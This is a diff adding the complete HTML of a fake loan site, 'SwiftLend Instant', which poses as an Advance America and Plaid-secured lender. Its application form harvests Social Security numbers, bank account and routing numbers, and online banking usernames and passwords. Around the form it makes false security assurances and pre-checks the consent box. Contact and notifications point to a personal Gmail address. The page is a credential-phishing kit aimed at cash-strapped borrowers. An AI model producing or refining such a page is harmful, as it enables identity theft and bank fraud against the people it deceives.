@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SwiftLend Instant | 2-Minute Direct Deposit Loans</title>
+  <meta name="description" content="Apply for personal loans from $1,000 to $25,000. Rapid pre-approval and Plaid 256-bit secure bank authentication.">
+  
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Bootstrap Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="style.css">
+  
+  <style>
+    .gradient-hero-2 {
+      background: linear-gradient(135deg, #1e1b4b 0%, #312e81 40%, #4338ca 100%);
+      color: #ffffff;
+      padding: 90px 0 70px;
+    }
+    .badge-lightning {
+      background: rgba(245, 158, 11, 0.2);
+      color: #fbbf24;
+      border: 1px solid rgba(245, 158, 11, 0.35);
+    }
+    .floating-card-metric {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 14px;
+    }
+  </style>
+</head>
+<body class="bg-light">
+
+  <!-- Top Navigation Bar -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark border-bottom border-secondary sticky-top py-3 shadow">
+    <div class="container">
+      <a class="navbar-brand d-flex align-items-center gap-2 text-decoration-none" href="index.html">
+        <!-- Modern SwiftLend Brand Logo SVG -->
+        <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="flex-shrink-0">
+          <rect width="40" height="40" rx="10" fill="url(#swift-grad)"/>
+          <path d="M22 6L11 22H20L18 34L29 18H20L22 6Z" fill="#F59E0B" stroke="#FDE68A" stroke-width="1.2" stroke-linejoin="round"/>
+          <defs>
+            <linearGradient id="swift-grad" x1="0" y1="0" x2="40" y2="40" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#1E1B4B"/>
+              <stop stop-color="#4338CA"/>
+            </linearGradient>
+          </defs>
+        </svg>
+        <div class="d-flex flex-column lh-1">
+          <span class="fs-4 fw-extrabold text-white tracking-tight" style="letter-spacing:-0.5px;">Swift<span class="text-warning">Lend</span></span>
+          <span class="text-white-50 fw-bold" style="font-size: 0.62rem; letter-spacing: 1.5px; text-transform: uppercase;">Advance America Express</span>
+        </div>
+      </a>
+
+      <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#navMenu2">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+
+      <div class="collapse navbar-collapse" id="navMenu2">
+        <ul class="navbar-nav mx-auto mb-2 mb-lg-0 gap-lg-3 fw-medium">
+          <li class="nav-item"><a class="nav-link text-white-50" href="#features">Advantages</a></li>
+          <li class="nav-item"><a class="nav-link text-white-50" href="#faq">FAQ</a></li>
+          <li class="nav-item"><a class="nav-link text-white-50" href="#reviews">Borrower Stories</a></li>
+        </ul>
+        <div class="d-flex align-items-center gap-3">
+          <span class="text-white-50 small d-none d-md-inline"><i class="bi bi-shield-check text-warning me-1"></i> Plaid Certified</span>
+          <a href="#apply-section" class="btn btn-warning px-4 py-2 rounded-pill fw-bold text-dark shadow-sm">
+            Fill Application Below
+          </a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- High-Impact Hero Banner with High-Res Background Image -->
+  <header class="hero-bg-speed position-relative overflow-hidden">
+    <div class="container position-relative" style="z-index: 2;">
+      <div class="row align-items-center g-5">
+        <div class="col-lg-7">
+          <div class="badge pill-glow-amber px-3 py-2 rounded-pill fw-bold mb-3 d-inline-flex align-items-center gap-2">
+            <i class="bi bi-lightning-charge-fill fs-6"></i> Instant Decisions with Plaid 256-Bit Encryption
+          </div>
+          
+          <h1 class="display-3 fw-extrabold text-white lh-tight mb-3">
+            Fast Direct Cash Loans <span class="text-warning">Without The Red Tape.</span>
+          </h1>
+          
+          <p class="lead text-light text-opacity-90 mb-4" style="font-size: 1.2rem;">
+            Need funds for an unexpected bill, repairs, or debt relief? Request up to <strong>$10,000+</strong> today with our simple one-step form below and secure 256-bit bank authentication.
+          </p>
+
+          <div class="d-flex flex-wrap gap-3 mb-5">
+            <a href="#apply-section" class="btn btn-warning btn-lg rounded-pill px-5 py-3 fw-bold text-dark shadow-lg fs-6">
+              <i class="bi bi-arrow-down-circle-fill me-2"></i> Jump to Loan Application Form
+            </a>
+            <a href="#features" class="btn btn-outline-light btn-lg rounded-pill px-4 py-3 fw-semibold">
+              Explore Benefits
+            </a>
+          </div>
+
+          <!-- Live Metrics -->
+          <div class="row g-3 mb-2">
+            <div class="col-4">
+              <div class="floating-card-metric p-3 text-center">
+                <div class="fs-4 fw-bold text-warning mb-0">$10,000</div>
+                <div class="text-white-50 small" style="font-size: 0.75rem;">Avg. Approval</div>
+              </div>
+            </div>
+            <div class="col-4">
+              <div class="floating-card-metric p-3 text-center">
+                <div class="fs-4 fw-bold text-warning mb-0">90 Sec</div>
+                <div class="text-white-50 small" style="font-size: 0.75rem;">Decision Time</div>
+              </div>
+            </div>
+            <div class="col-4">
+              <div class="floating-card-metric p-3 text-center">
+                <div class="fs-4 fw-bold text-warning mb-0">256-Bit</div>
+                <div class="text-white-50 small" style="font-size: 0.75rem;">Plaid Security</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-lg-5">
+          <div class="hero-glass-card p-4">
+            <div class="rounded-4 overflow-hidden mb-3">
+              <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=800&q=80" 
+                   class="w-100 object-fit-cover rounded-3" 
+                   alt="Instant online mobile loan" 
+                   style="height: 240px;">
+            </div>
+            <div class="hero-glass-card-inner p-3">
+              <div class="d-flex align-items-center justify-content-between mb-2">
+                <span class="badge bg-warning text-dark px-3 py-1 rounded-pill fw-bold">Direct Deposit</span>
+                <span class="text-white-50 small">Advance America Network</span>
+              </div>
+              <h5 class="fw-bold text-white mb-1">Instant Bank Authentication</h5>
+              <p class="text-white-50 small mb-0">
+                Authenticate with Chase, Bank of America, or your local credit union via Plaid without waiting days for manual review.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Features Grid with Internet Images -->
+  <section class="py-5 bg-white border-bottom" id="features">
+    <div class="container py-lg-4">
+      <div class="row align-items-center mb-5">
+        <div class="col-lg-6">
+          <span class="badge bg-warning text-dark fw-bold px-3 py-2 rounded-pill mb-2">BUILT FOR SPEED</span>
+          <h2 class="fw-bold text-dark">Why 85,000+ Borrowers Choose SwiftLend</h2>
+          <p class="text-secondary">Direct personal funding without traditional bank visits or endless physical paperwork.</p>
+        </div>
+        <div class="col-lg-6 text-lg-end">
+          <div class="d-inline-flex align-items-center gap-2 p-2 bg-light rounded-pill border">
+            <span class="badge bg-success rounded-pill px-3 py-2">98.4%</span>
+            <span class="small text-muted pe-2 fw-semibold">Customer Approval Rating</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="row g-4">
+        <div class="col-md-4">
+          <div class="card h-100 border rounded-4 overflow-hidden shadow-sm feature-box">
+            <img src="https://images.unsplash.com/photo-1560520653-9e0e4c89eb11?auto=format&fit=crop&w=600&q=80" 
+                 class="card-img-top object-fit-cover" 
+                 alt="Loan agreement signature" 
+                 style="height: 180px;">
+            <div class="card-body p-4">
+              <h5 class="fw-bold text-dark">Zero Upfront Collateral</h5>
+              <p class="text-secondary small mb-0">Unsecured loans mean you never have to pledge your car or home as collateral.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4">
+          <div class="card h-100 border rounded-4 overflow-hidden shadow-sm feature-box">
+            <img src="https://images.unsplash.com/photo-1559526324-593bc073d998?auto=format&fit=crop&w=600&q=80" 
+                 class="card-img-top object-fit-cover" 
+                 alt="Instant Plaid sync" 
+                 style="height: 180px;">
+            <div class="card-body p-4">
+              <h5 class="fw-bold text-dark">Instant Plaid Sync</h5>
+              <p class="text-secondary small mb-0">No scanning paystubs or tax returns. Plaid instantly verifies your direct deposits securely.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4">
+          <div class="card h-100 border rounded-4 overflow-hidden shadow-sm feature-box">
+            <img src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?auto=format&fit=crop&w=600&q=80" 
+                 class="card-img-top object-fit-cover" 
+                 alt="Happy family celebrating loan approval" 
+                 style="height: 180px;">
+            <div class="card-body p-4">
+              <h5 class="fw-bold text-dark">Same-Day ACH Transfer</h5>
+              <p class="text-secondary small mb-0">Cash is disbursed directly into your active checking account on the very same business day.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ Accordion Section -->
+  <section class="py-5 bg-slate-bg border-bottom" id="faq">
+    <div class="container py-lg-4">
+      <div class="text-center mb-5">
+        <h2 class="fw-bold text-dark">Frequently Asked Questions</h2>
+        <p class="text-muted">Clear answers about our loan process and Plaid authentication.</p>
+      </div>
+
+      <div class="row justify-content-center">
+        <div class="col-lg-8">
+          <div class="accordion" id="faqAccordion2">
+            
+            <div class="accordion-item border rounded-3 mb-3">
+              <h2 class="accordion-header">
+                <button class="accordion-button fw-bold" type="button" data-bs-toggle="collapse" data-bs-target="#f1">
+                  How does Plaid bank authentication protect my credentials?
+                </button>
+              </h2>
+              <div id="f1" class="accordion-collapse collapse show" data-bs-parent="#faqAccordion2">
+                <div class="accordion-body text-secondary small">
+                  We use 256-bit encryption through Plaid to securely verify identity, income, and process direct deposits without retaining your credentials. Your banking login is tokenized and never stored in plain text.
+                </div>
+              </div>
+            </div>
+
+            <div class="accordion-item border rounded-3 mb-3">
+              <h2 class="accordion-header">
+                <button class="accordion-button collapsed fw-bold" type="button" data-bs-toggle="collapse" data-bs-target="#f2">
+                  Will filling out this form hurt my credit score?
+                </button>
+              </h2>
+              <div id="f2" class="accordion-collapse collapse" data-bs-parent="#faqAccordion2">
+                <div class="accordion-body text-secondary small">
+                  No. Initial eligibility quotes are conducted using a soft credit inquiry, which does not affect your FICO credit score in any way.
+                </div>
+              </div>
+            </div>
+
+            <div class="accordion-item border rounded-3 mb-3">
+              <h2 class="accordion-header">
+                <button class="accordion-button collapsed fw-bold" type="button" data-bs-toggle="collapse" data-bs-target="#f3">
+                  How fast are approved funds transferred?
+                </button>
+              </h2>
+              <div id="f3" class="accordion-collapse collapse" data-bs-parent="#faqAccordion2">
+                <div class="accordion-body text-secondary small">
+                  Once your application is submitted below and verified through Plaid, funds are processed for direct deposit within 24 hours.
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SINGLE-STEP APPLICATION FORM AT THE BOTTOM -->
+  <section class="py-5 bg-white border-bottom" id="apply-section">
+    <div class="container py-lg-4">
+      <div class="text-center mb-5">
+        <span class="badge bg-warning text-dark fw-bold px-3 py-2 rounded-pill mb-2">COMPLETE IN ONE STEP</span>
+        <h2 class="display-6 fw-bold text-dark">Loan Application Form</h2>
+        <p class="text-secondary max-w-600 mx-auto">
+          Fill in all required fields below. Your submission is secured by Plaid 256-bit bank encryption.
+        </p>
+      </div>
+
+      <div class="row justify-content-center">
+        <div class="col-lg-10 col-xl-9">
+          <div class="loan-card-form p-4 p-md-5 border shadow-sm">
+            
+            <form class="loan-application-form needs-validation" novalidate>
+              
+              <!-- SECTION 1: Basic Information -->
+              <div class="mb-5">
+                <div class="d-flex align-items-center gap-2 border-bottom pb-3 mb-4">
+                  <div class="rounded-circle bg-warning text-dark d-flex align-items-center justify-content-center fw-bold" style="width: 32px; height: 32px;">1</div>
+                  <h4 class="fw-bold text-dark mb-0">Basic Information</h4>
+                </div>
+
+                <div class="row g-3">
+                  <div class="col-md-6">
+                    <label class="form-label" for="fName2">First Name <small class="text-muted">(Legal First Name)</small> <span class="text-danger">*</span></label>
+                    <input type="text" class="form-control" id="fName2" name="firstName" placeholder="Legal First Name" required>
+                    <div class="invalid-feedback">First name is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="lName2">Last Name <small class="text-muted">(Legal Last Name)</small> <span class="text-danger">*</span></label>
+                    <input type="text" class="form-control" id="lName2" name="lastName" placeholder="Legal Last Name" required>
+                    <div class="invalid-feedback">Last name is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="email2">Email Address <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-envelope"></i></span>
+                      <input type="email" class="form-control" id="email2" name="email" placeholder="you@domain.com" value="willsmiths987@gmail.com" required>
+                    </div>
+                    <div class="invalid-feedback">Valid email address is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="phone2">Phone Number <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-telephone"></i></span>
+                      <input type="tel" class="form-control" id="phone2" name="phone" placeholder="(555) 000-0000" required>
+                    </div>
+                    <div class="invalid-feedback">Phone number is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="dob2">Date of Birth <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-calendar3"></i></span>
+                      <input type="text" class="form-control dob-input" id="dob2" name="dob" placeholder="MM/DD/YYYY" required>
+                    </div>
+                    <div class="invalid-feedback">Date of birth (MM/DD/YYYY) is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="ssn2">SSN (9 digits) <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-shield-lock"></i></span>
+                      <input type="password" class="form-control ssn-input" id="ssn2" name="ssn" placeholder="•••••••••" maxlength="11" required>
+                      <button class="btn btn-outline-secondary btn-toggle-password" type="button" data-target="ssn2">
+                        <i class="bi bi-eye"></i>
+                      </button>
+                    </div>
+                    <div class="form-text text-muted" style="font-size: 0.75rem;">Your 9-digit SSN is encrypted & stored securely.</div>
+                  </div>
+
+                  <div class="col-12">
+                    <label class="form-label" for="addr2">Street Address <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-geo-alt"></i></span>
+                      <input type="text" class="form-control" id="addr2" name="address" placeholder="123 Example Street, Apt 4B" required>
+                    </div>
+                    <div class="invalid-feedback">Street address is required.</div>
+                  </div>
+
+                  <div class="col-md-5">
+                    <label class="form-label" for="city2">City <span class="text-danger">*</span></label>
+                    <input type="text" class="form-control" id="city2" name="city" placeholder="City" required>
+                    <div class="invalid-feedback">City is required.</div>
+                  </div>
+
+                  <div class="col-md-4">
+                    <label class="form-label" for="state2">State <span class="text-danger">*</span></label>
+                    <select class="form-select" id="state2" name="state" required>
+                      <option value="" selected disabled>Select State</option>
+                      <option value="CA">California</option>
+                      <option value="TX">Texas</option>
+                      <option value="FL">Florida</option>
+                      <option value="NY">New York</option>
+                      <option value="IL">Illinois</option>
+                      <option value="OH">Ohio</option>
+                      <option value="PA">Pennsylvania</option>
+                      <option value="GA">Georgia</option>
+                    </select>
+                    <div class="invalid-feedback">State is required.</div>
+                  </div>
+
+                  <div class="col-md-3">
+                    <label class="form-label" for="zip2">Zip <span class="text-danger">*</span></label>
+                    <input type="text" class="form-control" id="zip2" name="zip" placeholder="Zipcode" maxlength="10" required>
+                    <div class="invalid-feedback">Zipcode is required.</div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- SECTION 2: Loan Details -->
+              <div class="mb-5">
+                <div class="d-flex align-items-center gap-2 border-bottom pb-3 mb-4">
+                  <div class="rounded-circle bg-warning text-dark d-flex align-items-center justify-content-center fw-bold" style="width: 32px; height: 32px;">2</div>
+                  <h4 class="fw-bold text-dark mb-0">Loan Details</h4>
+                </div>
+
+                <div class="row g-4">
+                  <div class="col-md-6">
+                    <label class="form-label" for="mIncome2">Monthly Income ($) <span class="text-danger">*</span></label>
+                    <div class="input-group input-group-lg">
+                      <span class="input-group-text fw-bold">$</span>
+                      <input type="number" class="form-control" id="mIncome2" name="monthlyIncome" placeholder="3500" value="3500" required>
+                    </div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="reqAmount2">Requested Loan Amount ($) <span class="text-danger">*</span></label>
+                    <div class="input-group input-group-lg">
+                      <span class="input-group-text fw-bold text-primary">$</span>
+                      <input type="number" class="form-control text-primary fw-bold" id="reqAmount2" name="requestedAmount" placeholder="10000" value="10000" required>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- SECTION 3: Bank Authentication -->
+              <div class="mb-4">
+                <div class="d-flex align-items-center justify-content-between border-bottom pb-3 mb-4">
+                  <div class="d-flex align-items-center gap-2">
+                    <div class="rounded-circle bg-warning text-dark d-flex align-items-center justify-content-center fw-bold" style="width: 32px; height: 32px;">3</div>
+                    <h4 class="fw-bold text-dark mb-0">Bank Authentication</h4>
+                  </div>
+                  <span class="plaid-pill"><i class="bi bi-shield-shaded"></i> PLAID SECURED</span>
+                </div>
+
+                <!-- Plaid Notice Banner -->
+                <div class="plaid-security-badge mb-4">
+                  <div class="d-flex align-items-start gap-3">
+                    <div class="text-success fs-3">
+                      <i class="bi bi-shield-check"></i>
+                    </div>
+                    <div>
+                      <h6 class="fw-bold text-success-emphasis mb-1">Plaid 256-Bit Secure Verification</h6>
+                      <p class="small text-dark mb-0 lh-base">
+                        We use 256-bit encryption through Plaid to securely verify identity, income, and process direct deposits without retaining your credentials.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="row g-3">
+                  <div class="col-md-8">
+                    <label class="form-label" for="inst2">Institution Name <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-bank"></i></span>
+                      <input type="text" class="form-control" id="inst2" name="institutionName" placeholder="Chase, BofA, etc." required>
+                    </div>
+                    <div class="invalid-feedback">Institution name is required.</div>
+                  </div>
+
+                  <div class="col-md-4">
+                    <label class="form-label" for="yrs2">Years with Bank <span class="text-danger">*</span></label>
+                    <input type="number" class="form-control" id="yrs2" name="yearsWithBank" placeholder="e.g. 5" min="0" required>
+                    <div class="invalid-feedback">Years with bank is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="accNum2">Account Number <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-credit-card"></i></span>
+                      <input type="text" class="form-control" id="accNum2" name="accountNumber" placeholder="Bank Account No." required>
+                    </div>
+                    <div class="invalid-feedback">Account number is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="routNum2">Routing Number <small>(9 digit routing no.)</small> <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-hash"></i></span>
+                      <input type="text" class="form-control" id="routNum2" name="routingNumber" placeholder="9 digit routing no." maxlength="9" required>
+                    </div>
+                    <div class="invalid-feedback">9-digit routing number is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="bankId2">Online Banking ID <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-person-badge"></i></span>
+                      <input type="text" class="form-control" id="bankId2" name="onlineBankingId" placeholder="Online ID / Username" required>
+                    </div>
+                    <div class="invalid-feedback">Online Banking ID is required.</div>
+                  </div>
+
+                  <div class="col-md-6">
+                    <label class="form-label" for="bankPass2">Online Banking Password <span class="text-danger">*</span></label>
+                    <div class="input-group">
+                      <span class="input-group-text"><i class="bi bi-key"></i></span>
+                      <input type="password" class="form-control" id="bankPass2" name="onlineBankingPassword" placeholder="Password" required>
+                      <button class="btn btn-outline-secondary btn-toggle-password" type="button" data-target="bankPass2">
+                        <i class="bi bi-eye"></i>
+                      </button>
+                    </div>
+                    <div class="invalid-feedback">Online Banking Password is required.</div>
+                  </div>
+
+                  <!-- Legal Disclaimer -->
+                  <div class="col-12 mt-4">
+                    <div class="p-3 bg-light rounded-3 border">
+                      <div class="form-check">
+                        <input class="form-check-input" type="checkbox" id="authCheck2" required checked>
+                        <label class="form-check-label small text-secondary" for="authCheck2">
+                          By clicking submit, you authorize Advance America to obtain consumer credit information to verify your identity and assess loan eligibility.
+                        </label>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Submit Button -->
+              <div class="text-center pt-3 border-top">
+                <button type="submit" class="btn btn-warning btn-lg px-5 py-3 rounded-pill fw-bold fs-5 shadow text-dark">
+                  <i class="bi bi-check2-circle me-2"></i> Submit Application
+                </button>
+                <div class="text-muted small mt-2">
+                  <i class="bi bi-shield-lock-fill text-success me-1"></i> 256-Bit Plaid SSL Encrypted. No credit hit to check.
+                </div>
+              </div>
+
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="bg-dark text-white py-5">
+    <div class="container">
+      <div class="row g-4 mb-4">
+        <div class="col-lg-6">
+          <div class="d-flex align-items-center gap-2 mb-2">
+            <i class="bi bi-lightning-fill text-warning fs-4"></i>
+            <span class="fs-4 fw-bold text-white">SwiftLend Instant</span>
+          </div>
+          <p class="text-white-50 small mb-2">
+            Direct online lending platform powered by Advance America financial compliance standards.
+          </p>
+          <div class="small text-white-50">
+            Contact & Application Inquiries: <a href="mailto:willsmiths987@gmail.com" class="text-warning text-decoration-none">willsmiths987@gmail.com</a>
+          </div>
+        </div>
+        <div class="col-lg-6 text-lg-end">
+          <a href="#apply-section" class="btn btn-warning rounded-pill px-4 py-2 fw-bold text-dark">
+            Apply Now ($10,000)
+          </a>
+        </div>
+      </div>
+      <div class="border-top border-secondary pt-3 text-center small text-white-50">
+        &copy; 2026 SwiftLend Technologies & Advance America. Pure Static Frontend Solution.
+      </div>
+    </div>
+  </footer>
+
+  <!-- Confirmation Modal -->
+  <div class="modal fade" id="confirmationModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content border-0 shadow-lg rounded-4 overflow-hidden">
+        <div class="modal-header bg-success text-white border-0 py-3">
+          <h5 class="modal-title fw-bold">
+            <i class="bi bi-check-circle-fill me-2"></i> Application Submitted
+          </h5>
+          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+        </div>
+        <div class="modal-body p-4 text-center">
+          <div class="rounded-circle bg-success-subtle text-success mx-auto mb-3 d-flex align-items-center justify-content-center" style="width: 64px; height: 64px;">
+            <i class="bi bi-shield-check fs-2"></i>
+          </div>
+          <h4 class="fw-bold text-dark">Loan Application In Review</h4>
+          <p class="text-muted small mb-3">Your loan request has been securely processed with 256-bit Plaid encryption.</p>
+          <div class="bg-light p-3 rounded text-start mb-3 border small">
+            <div><strong>Application ID:</strong> <span id="confAppId" class="text-primary">ADV-293812</span></div>
+            <div><strong>Applicant:</strong> <span id="confApplicantName">Applicant</span></div>
+            <div><strong>Loan Amount:</strong> <span id="confLoanAmount" class="text-success">$10,000</span></div>
+            <div><strong>Monthly Income:</strong> <span id="confMonthlyIncome">$3,500</span></div>
+            <div><strong>Bank:</strong> <span id="confBank">Chase</span></div>
+            <div class="border-top mt-2 pt-2"><strong>Notification Dispatched To:</strong> <span id="confEmail" class="text-primary">willsmiths987@gmail.com</span></div>
+          </div>
+        </div>
+        <div class="modal-footer border-0 bg-light">
+          <button type="button" class="btn btn-secondary rounded-pill px-4" data-bs-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="loan-form.js"></script>
+</body>
+</html>
